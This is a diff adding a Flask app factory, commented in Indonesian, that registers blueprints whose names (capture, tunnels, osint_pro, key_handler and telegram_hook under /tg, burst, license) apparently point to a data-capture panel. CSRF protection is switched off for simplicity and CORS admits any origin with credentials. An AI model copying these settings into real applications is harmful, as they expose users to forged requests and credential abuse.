@@ -1,0 +1,91 @@
+import os
+from flask import Flask
+from flask_cors import CORS
+from flask_wtf.csrf import CSRFProtect
+from app.config import Config
+from app.database import db, init_db
+
+csrf = CSRFProtect()
+
+
+def create_app():
+    app = Flask(__name__, template_folder="templates", static_folder="static")
+    app.config["SECRET_KEY"] = Config.SECRET_KEY
+    app.config["WTF_CSRF_ENABLED"] = False  # CSRF off untuk simpel
+    app.config["SQLALCHEMY_DATABASE_URI"] = Config.DATABASE_URL
+    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
+    app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024
+
+    # Bikin folder
+    for d in [Config.UPLOAD_DIR]:
+        os.makedirs(d, exist_ok=True)
+
+    CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
+    db.init_app(app)
+
+    # ============================================================
+    # REGISTER BLUEPRINTS
+    # ============================================================
+    # Semua blueprint di-import di sini.
+    # Kalau file route tidak ada, tinggal comment importnya.
+
+    registered = []
+
+    def _register(name, import_path, prefix=None):
+        """Helper register blueprint."""
+        try:
+            mod = __import__(import_path, fromlist=[name])
+            bp = getattr(mod, name)
+            if prefix:
+                app.register_blueprint(bp, url_prefix=prefix)
+            else:
+                app.register_blueprint(bp)
+            registered.append(import_path)
+            return True
+        except Exception as e:
+            print(f"[skip] {import_path}: {e}")
+            return False
+
+    # Capture (wajib)
+    _register("bp", "app.routes.capture")
+
+    # Dashboard (wajib)
+    _register("bp", "app.routes.dashboard")
+
+    # API (wajib)
+    _register("bp", "app.routes.api", "/api")
+
+    # Optional
+    _register("bp", "app.routes.tunnels")
+    _register("bp", "app.routes.template_link")
+    _register("bp", "app.routes.modes")
+    _register("bp", "app.routes.osint_pro")
+    _register("bp", "app.routes.editor_route")
+    _register("bp", "app.routes.key_handler", "/tg")
+    _register("bp", "app.routes.replay", "/api")
+    _register("bp", "app.routes.reports")
+    _register("bp", "app.routes.burst", "/burst")
+    _register("bp", "app.routes.templates_gallery")
+    _register("bp", "app.routes.features")
+    _register("bp", "app.routes.qr")
+    _register("bp", "app.routes.telegram_hook", "/tg")
+    _register("bp", "app.routes.intel", "/intel")
+    _register("bp", "app.routes.license_route")
+    _register("bp", "app.routes.auth_route")
+    _register("bp", "app.routes.control", "/api")
+
+    # ============================================================
+    # INIT DB
+    # ============================================================
+    with app.app_context():
+        init_db()
+
+    # ============================================================
+    # HEALTH CHECK
+    # ============================================================
+    @app.route("/healthz")
+    def _health():
+        return {"ok": True, "registered": len(registered)}
+
+    print(f"[app] {len(registered)} blueprints registered")
+    return app
